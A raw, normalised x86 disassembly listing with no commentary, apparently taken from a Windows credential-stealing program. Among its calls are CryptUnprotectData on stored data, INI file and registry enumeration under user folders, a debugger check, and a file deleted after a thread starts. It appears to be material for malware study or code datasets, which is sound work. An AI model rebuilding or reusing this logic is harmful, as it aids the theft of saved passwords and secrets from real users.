mov edi [ CloseHandle@IAT ]
pop ecx
pop ecx
push [ ebp - 0x14 ]
call edi
push [ ebp - 0x10 ]
call edi
lea eax [ ebp - 0x20f4 ]
push r--data
push eax
call sub_410c4c
mov edi eax
cmp edi esi
pop ecx
pop ecx
je r-xdata
push esi
call sub_40f16a
push esi
mov [ rw-data ] esi
call sub_40f2e7
pop ecx
pop ecx
lea eax [ ebp - 0x4 ]
push eax
push esi
lea eax [ ebp - 0x14 ]
push eax
push sub_4032c1
push esi
push esi
call [ CreateThread@IAT ]
lea eax [ ebp - 0x20f4 ]
push eax
call [ DeleteFileA@IAT ]
push 0x2
push esi
push edi
call sub_410e24
push edi
call sub_410e80
mov ebx eax
push ebx
call sub_411160
push esi
push esi
push edi
mov [ ebp - 0x4 ] eax
call sub_410e24
push edi
push ebx
push 0x1
push [ ebp - 0x4 ]
call sub_410d0d
add esp 0x30
push [ ebp - 0x4 ]
push ebx
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x2c ]
call sub_40ec7e
push [ ebp - 0x4 ]
call sub_410a7a
push edi
call sub_410b53
pop ecx
pop ecx
sub_40361f
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x2b4
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40eb9e
call sub_40b79a
xor ebx ebx
mov [ ebp + 0x20 ] 0xe0
mov [ ebp + 0x21 ] bl
mov [ ebp + 0x22 ] 0xc8
mov [ ebp + 0x23 ] bl
mov [ ebp + 0x24 ] 0x8
mov [ ebp + 0x25 ] 0x1
mov [ ebp + 0x26 ] 0x10
mov [ ebp + 0x27 ] 0x1
mov [ ebp + 0x28 ] 0xc0
mov [ ebp + 0x29 ] bl
mov [ ebp + 0x2a ] 0x14
mov [ ebp + 0x2b ] 0x1
mov [ ebp + 0x2c ] 0xd8
mov [ ebp + 0x2d ] bl
mov [ ebp + 0x2e ] 0xdc
mov [ ebp + 0x2f ] bl
mov [ ebp + 0x30 ] 0xb4
mov [ ebp + 0x31 ] bl
mov [ ebp + 0x32 ] 0xe4
mov [ ebp + 0x33 ] bl
mov [ ebp + 0x34 ] 0x18
mov [ ebp + 0x35 ] 0x1
mov [ ebp + 0x36 ] 0x14
mov [ ebp + 0x37 ] 0x1
mov [ ebp + 0x38 ] 0x4
mov [ ebp + 0x39 ] 0x1
mov [ ebp + 0x3a ] 0xb4
mov [ ebp + 0x3b ] bl
mov [ ebp + 0x3c ] 0xd0
mov [ ebp + 0x3d ] bl
mov [ ebp + 0x3e ] 0xdc
mov [ ebp + 0x3f ] bl
mov [ ebp + 0x40 ] 0xd0
mov [ ebp + 0x41 ] bl
mov [ ebp + 0x42 ] 0xe0
mov [ ebp + 0x43 ] bl
mov [ ebp + 0x44 ] 0xb4
mov [ ebp + 0x45 ] bl
mov [ ebp + 0x46 ] 0xe0
mov [ ebp + 0x47 ] bl
mov [ ebp + 0x48 ] 0xd8
mov [ ebp + 0x49 ] bl
mov [ ebp + 0x4a ] 0xdc
mov [ ebp + 0x4b ] bl
mov [ ebp + 0x4c ] 0xc8
mov [ ebp + 0x4d ] bl
mov [ ebp + 0x4e ] 0xb4
mov [ ebp + 0x4f ] bl
mov [ ebp + 0x50 ] 0x10
mov [ ebp + 0x51 ] 0x1
mov [ ebp + 0x52 ] 0xd4
mov [ ebp + 0x53 ] bl
mov [ ebp + 0x54 ] 0x14
mov [ ebp + 0x55 ] 0x1
mov [ ebp + 0x56 ] 0x18
mov [ ebp + 0x57 ] 0x1
mov [ ebp + 0x58 ] 0x14
mov [ ebp + 0x59 ] 0x1
mov [ ebp + 0x5a ] 0xd4
mov [ ebp + 0x5b ] bl
mov [ ebp + 0x5c ] 0x8
mov [ ebp + 0x5d ] 0x1
mov [ ebp + 0x5e ] 0xdc
mov [ ebp + 0x5f ] bl
mov [ ebp + 0x60 ] 0xdc
mov [ ebp + 0x61 ] bl
mov [ ebp + 0x62 ] 0xe4
mov [ ebp + 0x63 ] bl
mov [ ebp + 0x64 ] 0x8
push 0xfc
lea eax [ ebp - 0x23c ]
push ebx
push eax
mov [ ebp + 0x65 ] 0x1
mov [ ebp + 0x66 ] 0xc0
mov [ ebp + 0x67 ] bl
mov [ ebp + 0x68 ] bl
mov [ ebp + 0x69 ] bl
mov [ ebp + 0x6a ] bl
mov [ ebp + 0x6b ] bl
mov [ ebp + 0x6c ] 0xc8
mov [ ebp + 0x6d ] 0xf3
mov [ ebp + 0x6e ] 0x41
mov [ ebp - 0x140 ] bl
call sub_41112d
add esp 0xc
mov [ ebp + 0x74 ] ebx
mov [ ebp + 0x70 ] ebx
call sub_40b8bd
mov edi [ LoadLibraryA@IAT ]
push r--data
call edi
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
cmp eax ebx
mov [ ebp + 0x10 ] eax
je r-xdata
lea ecx [ ebp - 0x18 ]
call sub_40ed8a
pop edi
pop esi
pop ebx
add ebp 0x78
leave
retn
push r--data
call edi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp + 0x1c ] eax
push r--data
push edi
call esi
push r--data
push edi
mov [ ebp + 0x1c ] eax
call esi
push r--data
push edi
mov [ ebp + 0x18 ] eax
call esi
cmp [ ebp + 0x1c ] ebx
mov esi eax
mov [ ebp + 0x14 ] esi
je r-xdata
push [ ebp + 0x74 ]
call esi
xor edi edi
call sub_40bdbc
cmp [ ebp + 0x70 ] ebx
je r-xdata
cmp [ ebp + 0x18 ] ebx
je r-xdata
call sub_40bb9f
mov esi 0x100
cmp esi ebx
jne r-xdata
inc edi
cmp edi [ ebp + 0x70 ]
jb r-xdata
push ebx
push ebx
push esi
lea eax [ ebp - 0x140 ]
push eax
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
lea eax [ ebp + 0x74 ]
push eax
lea eax [ ebp + 0x70 ]
push eax
push ebx
push r--data
call [ ebp + 0x1c ]
cmp [ ebp + 0x70 ] ebx
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x74 ]
lea eax [ eax + edi * 4 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x18 ]
mov [ ebp - 0x20 ] ecx
mov eax [ eax ]
mov eax [ eax + 0x1c ]
push esi
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x140 ]
push ebx
push eax
call sub_41112d
add esp 0xc
lea eax [ ebp + 0x20 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x1
push ebx
push ebx
lea eax [ ebp - 0x28 ]
push eax
push ebx
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x28 ] 0x4a
call [ ebp + 0x10 ]
cmp eax 0x1
jne r-xdata
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x140 ]
push eax
call sub_411738
test eax eax
pop ecx
jbe r-xdata
mov eax [ ebp + 0x74 ]
mov eax [ eax + edi * 4 ]
mov eax [ eax + 0x30 ]
push eax
mov [ ebp + 0x18 ] eax
call sub_411738
push eax
push [ ebp + 0x18 ]
lea eax [ ebp ]
push eax
call sub_40c364
add esp 0x10
push [ ebp + 0x4 ]
push [ ebp + 0x8 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40ec7e
lea eax [ ebp - 0x140 ]
push eax
call sub_411738
sub esp 0xc
mov ecx esp
push eax
lea eax [ ebp - 0x140 ]
push eax
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x3d ]
push eax
lea ecx [ ebp ]
call sub_40f80b
lea ecx [ ebp - 0x3d ]
call sub_40f609
push [ ebp + 0x4 ]
push [ ebp + 0x8 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40ec7e
lea ecx [ ebp ]
call sub_40f609
sub_403986
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push r--data
push [ ebp + 0x8 ]
xor ebx ebx
call sub_410c4c
mov edi eax
cmp edi ebx
pop ecx
pop ecx
je r-xdata
pop edi
pop esi
mov al bl
pop ebx
leave
retn
push 0x2
push ebx
push edi
call sub_410e24
push edi
call sub_410e80
push ebx
push ebx
push edi
mov esi eax
call sub_410e24
lea eax [ esi + 0x5 ]
push eax
call sub_411160
push edi
push 0x1
mov ebx eax
push esi
push ebx
call sub_410d0d
add esp 0x30
push 0x3e8
sub esp 0x10
mov ecx esp
push [ ebp + 0xc ]
call sub_40f4c7
lea ecx [ ebp - 0x18 ]
call sub_40eb9e
push ebx
push esi
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40ec7e
push ebx
call sub_410a7a
push edi
call sub_410b53
pop ecx
pop ecx
lea ecx [ ebp - 0x18 ]
mov bl 0x1
call sub_40ed8a
sub_403a29
push ebp
mov ebp esp
sub esp 0x800
push ebx
push esi
push edi
push 0x3ff
lea eax [ ebp - 0x3ff ]
push 0x0
push eax
mov [ ebp - 0x400 ] 0x0
call sub_41112d
mov esi [ lstrcpynA@IAT ]
add esp 0xc
mov ebx 0x3e8
push ebx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x400 ]
push eax
call esi
mov edi [ lstrcatA@IAT ]
push r--data
lea eax [ ebp - 0x400 ]
push eax
call edi
lea eax [ ebp - 0x400 ]
push r--data
push eax
call sub_403986
test al al
pop ecx
pop ecx
jne r-xdata
push 0x3ff
lea eax [ ebp - 0x7ff ]
push 0x0
push eax
mov [ ebp - 0x800 ] 0x0
call sub_41112d
add esp 0xc
push ebx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x800 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x800 ]
push eax
call edi
lea eax [ ebp - 0x800 ]
push r--data
push eax
call sub_403986
test al al
pop ecx
pop ecx
jne r-xdata
push ebx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x400 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x400 ]
push eax
call edi
lea eax [ ebp - 0x400 ]
push r--data
push eax
call sub_403986
pop ecx
pop ecx
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
push ebx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x800 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x800 ]
push eax
call edi
lea eax [ ebp - 0x800 ]
push r--data
push eax
call sub_403986
pop ecx
pop ecx
sub_403b47
push ebp
mov ebp esp
mov eax 0x3c18
call sub_40f8bc
push ebx
push esi
push edi
mov esi 0x3ff
push esi
lea eax [ ebp - 0x417 ]
push 0x0
push eax
mov [ ebp - 0x418 ] 0x0
call sub_41112d
add esp 0xc
push 0x3e8
push [ ebp + 0x8 ]
lea eax [ ebp - 0x418 ]
push eax
call [ lstrcpynA@IAT ]
push r--data
lea eax [ ebp - 0x418 ]
push eax
call [ lstrcatA@IAT ]
push 0x27ff
lea eax [ ebp - 0x3c17 ]
push 0x0
push eax
mov [ ebp - 0x3c18 ] 0x0
call sub_41112d
add esp 0xc
lea eax [ ebp - 0x418 ]
push eax
lea ebx [ ebp - 0x3c18 ]
push 0x1ffe
mov eax ebx
push eax
call [ GetPrivateProfileSectionNamesA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x3c18 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov edi [ GetPrivateProfileStringA@IAT ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx ] 0x0
jne r-xdata
inc ebx
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
inc ebx
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40eb9e
lea eax [ ebp - 0x1418 ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40ec7e
lea eax [ ebp - 0x818 ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40ec7e
lea eax [ ebp - 0xc18 ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40ec7e
lea eax [ ebp - 0x1018 ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40ec7e
lea ecx [ ebp - 0x18 ]
call sub_40ed8a
cmp [ ebx ] 0x0
jne r-xdata
lea eax [ ebp - 0x418 ]
push eax
push esi
lea eax [ ebp - 0x1418 ]
push eax
push 0x0
push r--data
push ebx
call edi
lea eax [ ebp - 0x418 ]
push eax
push esi
lea eax [ ebp - 0x818 ]
push eax
push 0x0
push r--data
push ebx
call edi
lea eax [ ebp - 0x418 ]
push eax
push esi
lea eax [ ebp - 0xc18 ]
push eax
push 0x0
push r--data
push ebx
call edi
lea eax [ ebp - 0x418 ]
push eax
push esi
lea eax [ ebp - 0x1018 ]
push eax
push 0x0
push r--data
push ebx
call edi
jmp r-xdata
sub_403d2c
push ebp
mov ebp esp
sub esp 0x528
push ebx
push esi
xor ebx ebx
push 0x3ff
lea eax [ ebp - 0x423 ]
push ebx
push eax
mov [ ebp - 0x424 ] bl
call sub_41112d
add esp 0xc
lea eax [ ebp - 0x424 ]
push eax
push ebx
push ebx
push 0x1a
push ebx
call [ SHGetFolderPathA@IAT ]
test eax eax
jne r-xdata
push edi
push 0x6
pop ecx
mov esi r--data
lea edi [ ebp - 0x24 ]
[ edi ] [ esi ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push ebx
lea eax [ ebp - 0x24 ]
push eax
push 0x80000001
movsb [ edi ] [ esi ]
mov [ ebp - 0x8 ] 0x104
call [ RegOpenKeyExA@IAT ]
test eax eax
pop edi
jne r-xdata
push r--data
lea eax [ ebp - 0x424 ]
push eax
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x424 ]
push eax
call sub_403a29
lea eax [ ebp - 0x424 ]
push eax
call sub_403b47
pop ecx
pop ecx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov esi [ SHGetFolderPathA@IAT ]
lea eax [ ebp - 0x424 ]
push eax
push ebx
push ebx
push 0x26
push ebx
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x528 ]
push eax
push ebx
push ebx
push r--data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x424 ]
push eax
push ebx
push ebx
push 0x26
push ebx
call esi
test eax eax
pop esi
pop ebx
jne r-xdata
push r--data
lea eax [ ebp - 0x424 ]
push eax
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x424 ]
push eax
call sub_403a29
lea eax [ ebp - 0x424 ]
push eax
call sub_403b47
pop ecx
pop ecx
lea eax [ ebp - 0x528 ]
push eax
call sub_403a29
lea eax [ ebp - 0x528 ]
push eax
call sub_403b47
pop ecx
pop ecx
leave
retn
push r--data
lea eax [ ebp - 0x424 ]
push eax
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x424 ]
push eax
call sub_403a29
lea eax [ ebp - 0x424 ]
push eax
call sub_403b47
pop ecx
pop ecx
sub_403e8f
push ebp
mov ebp esp
sub esp 0x20
call sub_40f095
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] esp
mov [ ebp - 0xc ] ebp
lea eax [ ebp - 0x4 ]
push eax
call sub_40f06f
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
mov [ ebp - 0x18 ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] sub_40f09c
lea eax [ ebp - 0x20 ]
mov [ fs : 0x0 ] eax
call sub_403d2c
mov eax [ ebp - 0x20 ]
mov [ fs : 0x0 ] eax
leave
retn
sub_403f06
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
lea ecx [ ebp - 0x20 ]
call sub_40f5f9
mov esi [ ebp + 0x14 ]
add esi esi
push esi
call sub_411160
pop ecx
xor ebx ebx
push ebx
push ebx
push esi
mov edi eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi ebx
jle r-xdata
push edi
call sub_410a7a
push [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push eax
call sub_40c364
mov eax [ ebp + 0x14 ]
add esp 0x10
cmp eax [ ebp - 0x8 ]
jge r-xdata
movzx eax [ ebx + edi ]
push eax
lea eax [ ebp - 0x2d ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40f6ee
lea ecx [ ebp - 0x2d ]
call sub_40f609
inc ebx
cmp ebx esi
jl r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
call sub_4110cf
mov esi [ ebp - 0x8 ]
add esp 0xc
lea ecx [ ebp - 0x10 ]
call sub_40f609
lea ecx [ ebp - 0x20 ]
call sub_40f609
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
push [ ebp + 0x10 ]
call sub_410a7a
push [ ebp - 0x8 ]
call sub_411160
pop ecx
pop ecx
mov [ ebp + 0x10 ] eax
sub_403fbd
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ eax ]
push esi
xor esi esi
push esi
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0x8 ]
push esi
push eax
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push esi
push esi
push 0x3ff
push [ ebp + 0xc ]
push 0xffffffff
push [ eax + 0x4 ]
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
push [ ebp - 0x4 ]
call [ CoTaskMemFree@IAT ]
call sub_401000
cmp eax 0x1
pop esi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
call sub_412188
leave
retn
call sub_412188
sub_404020
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ eax ]
push esi
xor esi esi
push esi
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
push eax
call [ ecx + 0x28 ]
mov eax [ ebp - 0x4 ]
push esi
push esi
push 0x3ff
push [ ebp + 0x10 ]
push 0xffffffff
push [ eax + 0x4 ]
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
push [ ebp - 0x4 ]
call [ CoTaskMemFree@IAT ]
pop esi
leave
retn
sub_404068
push ebp
mov ebp esp
sub esp 0xc78
push ebx
push esi
push edi
lea eax [ ebp - 0x478 ]
push eax
push [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
call sub_403fbd
lea eax [ ebp - 0xc78 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_404020
push 0x400
lea eax [ ebp - 0x878 ]
push eax
push 0xffffffff
push [ ebp + 0x14 ]
call sub_403f06
add esp 0x24
push ebx
push ebx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push [ ebp + 0x14 ]
mov esi eax
push [ ebp + 0x10 ]
mov eax [ rw-data ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0x44 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x4e ]
mov [ ebp - 0x4 ] 0x3
call sub_40f4c7
push eax
push rw-data
lea ecx [ ebp - 0x41 ]
call sub_40f4c7
mov ecx eax
call sub_40f7cb
test al al
jne r-xdata
mov [ ebp - 0x5 ] bl
push r--data
lea ecx [ ebp - 0x75 ]
mov [ ebp - 0x4 ] 0xf
call sub_40f45c
push eax
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x5b ]
call sub_40f4c7
mov ecx eax
call sub_40f7cb
test al al
jne r-xdata
test [ ebp - 0x4 ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0xffffffdf
lea ecx [ ebp - 0x2c ]
call sub_40f609
push rw-data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x3f
call sub_40f4c7
push eax
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_40f4c7
mov ecx eax
call sub_40f7cb
test al al
mov [ ebp - 0x5 ] 0x1
je r-xdata
test [ ebp - 0x4 ] 0x8
je r-xdata
and [ ebp - 0x4 ] 0xffffffef
lea ecx [ ebp - 0x68 ]
call sub_40f609
test [ ebp - 0x4 ] 0x20
je r-xdata
test [ ebp - 0x4 ] 0x4
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
lea ecx [ ebp - 0x5b ]
call sub_40f609
test [ ebp - 0x4 ] 0x2
je r-xdata
and [ ebp - 0x4 ] 0xfffffffb
lea ecx [ ebp - 0x75 ]
call sub_40f609
test [ ebp - 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0xfffffffd
lea ecx [ ebp - 0x41 ]
call sub_40f609
cmp [ ebp - 0x5 ] bl
jne r-xdata
lea ecx [ ebp - 0x4e ]
call sub_40f609
lea eax [ ebp - 0x478 ]
push eax
push eax
call [ lstrlenA@IAT ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov edi [ ebp + 0x8 ]
mov ecx edi
call sub_40ec7e
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x34 ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
lea eax [ ebp - 0x878 ]
push eax
push esi
je r-xdata
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx edi
call sub_40ec7e
push r--data
lea ecx [ ebp - 0x41 ]
call sub_40f45c
push eax
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x4e ]
call sub_40f4c7
mov ecx eax
call sub_40f7cb
lea ecx [ ebp - 0x4e ]
mov [ ebp - 0x5 ] al
call sub_40f609
lea ecx [ ebp - 0x41 ]
call sub_40f609
cmp [ ebp - 0x5 ] bl
je r-xdata
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx edi
call sub_40ec7e
push [ ebp - 0x18 ]
push 0x1
call sub_410962
pop ecx
pop ecx
mov esi eax
mov eax rw-data
push eax
push eax
call sub_411738
pop ecx
push eax
push edi
call sub_40ccea
push [ ebp - 0x18 ]
push esi
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
call sub_403f06
add esp 0x1c
push esi
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx edi
call sub_40ec7e
push esi
call sub_410d3e
pop ecx
push [ ebp - 0x14 ]
call [ LocalFree@IAT ]
jmp r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push [ ebp - 0xc ]
push eax
call sub_40c364
add esp 0xc
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx edi
call sub_40ec7e
lea ecx [ ebp - 0x2c ]
call sub_40f609
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x57
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp - 0x10 ]
call sub_411160
push [ ebp - 0x10 ]
mov edi eax
call sub_411160
mov esi [ ebp - 0xc ]
pop ecx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x4 ] 0x1
lea ecx [ eax + esi ]
jmp r-xdata
cmp [ eax + 0x1 ] 0x49
jne r-xdata
cmp esi ecx
jl r-xdata
cmp [ eax + 0x2 ] 0x43
jne r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push edi
call sub_410a7a
push [ ebp - 0x1c ]
call sub_410a7a
pop ecx
pop ecx
jmp r-xdata
cmp [ eax + 0x3 ] 0x4b
jne r-xdata
push eax
push edi
push 0xffffffff
push esi
call sub_403f06
add esp 0x10
push ebx
push ebx
push 0xffffffff
push edi
push ebx
push 0xfde9
mov [ ebp - 0x4 ] eax
call [ MultiByteToWideChar@IAT ]
push edi
push [ ebp - 0x4 ]
lea esi [ esi + eax * 2 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp + 0x8 ]
call sub_40ec7e
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
add ecx eax
cmp [ eax + 0x4 ] 0x18
je r-xdata
push eax
call [ CoTaskMemFree@IAT ]
sub_4043fc
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx [ eax ]
sub esp 0xc
lea edx [ ebp - 0xc ]
push edx
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push eax
call [ ecx + 0x54 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
leave
retn
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404068
add esp 0x10
push [ ebp - 0x8 ]
call [ CoTaskMemFree@IAT ]
dec [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x8 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_404461
push ebp
mov ebp esp
mov eax 0x6408
call sub_40f8bc
mov eax [ rw-data ]
mov ecx [ eax ]
push esi
push edi
lea edx [ ebp - 0x8 ]
push edx
push 0x0
push [ ebp + 0xc ]
push 0x0
push eax
call [ ecx + 0x3c ]
xor edi edi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
pop edi
pop esi
leave
retn
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4043fc
add esp 0xc
inc edi
add esi 0x10
dec [ ebp - 0x4 ]
jne r-xdata
jmp r-xdata
mov eax edi
shl eax 0x4
lea edx [ ebp - 0x4 ]
push edx
lea esi [ ebp + eax - 0x6408 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push esi
push 0x10
push eax
call [ ecx + 0xc ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4044d1
push ebp
mov ebp esp
mov eax 0x6408
call sub_40f8bc
mov eax [ rw-data ]
mov ecx [ eax ]
push esi
push edi
lea edx [ ebp - 0x8 ]
push edx
push 0x0
push 0x0
push eax
call [ ecx + 0x38 ]
xor edi edi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
pop edi
pop esi
leave
retn
push esi
push [ ebp + 0x8 ]
call sub_404461
pop ecx
inc edi
add esi 0x10
dec [ ebp - 0x4 ]
pop ecx
jne r-xdata
jmp r-xdata
mov eax edi
shl eax 0x4
lea edx [ ebp - 0x4 ]
push edx
lea esi [ ebp + eax - 0x6408 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push esi
push 0x10
push eax
call [ ecx + 0xc ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40453a
push ebp
lea ebp [ esp - 0x70 ]
mov eax 0x81d0
call sub_40f8bc
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x15f ]
push ebx
push eax
mov [ ebp - 0x160 ] bl
call sub_41112d
add esp 0xc
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x20 ]
push eax
lea eax [ ebp + 0x1c ]
push eax
lea eax [ ebp + 0x58 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0x24 ]
push eax
lea eax [ ebp + 0x30 ]
push eax
push ebx
lea eax [ ebp + 0x3c ]
push eax
lea eax [ ebp - 0x160 ]
push eax
push [ ebp + 0x7c ]
mov [ ebp + 0x3c ] 0x104
mov [ ebp + 0x30 ] ebx
mov [ ebp + 0x60 ] 0x3fff
call [ RegQueryInfoKeyA@IAT ]
cmp [ ebp + 0x58 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
add ebp 0x70
leave
retn
mov [ ebp + 0x5c ] ebx
jbe r-xdata
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp + 0x60 ]
push eax
lea eax [ ebp - 0x8160 ]
push eax
push [ ebp + 0x5c ]
mov [ ebp + 0x60 ] 0x3fff
push [ ebp + 0x7c ]
mov [ ebp - 0x8160 ] bx
call [ RegEnumValueW@IAT ]
test eax eax
jne r-xdata
inc [ ebp + 0x5c ]
mov eax [ ebp + 0x5c ]
cmp eax [ ebp + 0x58 ]
jb r-xdata
mov eax 0x2000
push eax
push 0x40
mov [ ebp + 0x68 ] eax
call [ GlobalAlloc@IAT ]
mov esi [ RegQueryValueExW@IAT ]
mov edi eax
mov [ ebp + 0x40 ] edi
jmp r-xdata
lea eax [ ebp + 0x68 ]
push eax
push edi
lea eax [ ebp + 0x54 ]
push eax
push ebx
